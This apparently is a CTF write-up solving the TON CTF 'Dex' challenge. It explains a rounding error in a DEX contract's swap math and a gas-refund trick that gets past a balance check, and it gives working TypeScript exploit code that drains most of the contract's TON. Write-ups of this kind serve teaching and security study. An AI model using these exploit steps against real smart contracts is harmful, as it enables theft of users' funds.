# :link: TON CTF Writeup. Our journey through TON CTF! From…

---

### Dex

In this challenge, we encountered a simple Dex contract that allowed users to perform trades by sending `Swap` messages. The Dex contract calculated balances after the trade based on the `amount` and `a_b` parameters. We discovered a significant issue in the `Swap` function — a rounding error in the calculation of `out_amount`. This allowed us to withdraw tokens from the Dex contract through multiple trades.

The goal of this challenge was to reduce the TON in the Dex contract to less than `0.5`. To achieve this, we needed to set `self.lock` to `false` before we could proceed with the `Slove` check. To set `self.lock` to `false`, we needed to get `user_a + user_b = 29`by sending multiple `Swap` messages with different `amount` values.

Once unlocked, we could send a `"Withdraw"` message to remove TON from the Dex contract. However, there was another obstacle: the following line of code prevented us from withdrawing more than 1 TON:

```
require(myBalance() > ton('1.0') + self.storageReserve + msg.value, 'Insufficient balance');
```

At this point, `myBalance()` was around `2.1` TON, and `self.storgeReserve` was `0.1` TON, which meant that a proper `msg.value` was needed to withdraw the majority of the remaining balance.

We devised a solution by sending some TON for the gas fee, temporarily boosting `myBalance()` in the Dex contract. Since the contract used the `SendRemainingValue` message mode, the remaining gas fee was returned to the caller after execution, allowing us to bypass the `require()` check and allow us for a larger `msg.value`. Eventually, we sent in `1.1` TON for gas fee and set `msg.value = 2`. This way, the `require()` would be like:

With `msg.value = 2`, we successfully withdrew `2` out of around `2.1` TON from the Dex contract and solved the challenge.

Solution

Here are the steps we followed:

- Step 1: Use `Swap` messages to set `user_a + user_b` equal to `29`.

```
await dex.send(
provider.sender(),
{
value: toNano('0.05'),
},
'CreateUser',
);

await sleep(8000);

for (let i = 0; i < 10; i++) {
await dex.send(
provider.sender(),
{
value: toNano('0.141'),
},
{
$$type: 'Swap',
amount: BigInt(i + 1),
a_b: 1n,
},
);
await sleep(10000);
await dex.send(
provider.sender(),
{
value: toNano('0.141'),
},
{
$$type: 'Swap',
amount: BigInt(i + 1),
a_b: 2n,
},
);
await sleep(10000);
}

await dex.send(
provider.sender(),
{
value: toNano('0.141'),
},
{
$$type: 'Swap',
amount: 1n,
a_b: 1n,
},
);

await sleep(10000);
```

- Step 2: Use a `Withdraw` message to remove TON from the contract.

```
await dex.send(
provider.sender(),
{
value: toNano('1.1'),
},
{
$$type: 'Withdraw',
value: toNano('2'),
},
);
```

- Step 3: Send the `“Solve”` message to complete the challenge.

```
await dex.send(
provider.sender(),
{
value: toNano('0.05'),
},
'Solve',
);
```

---
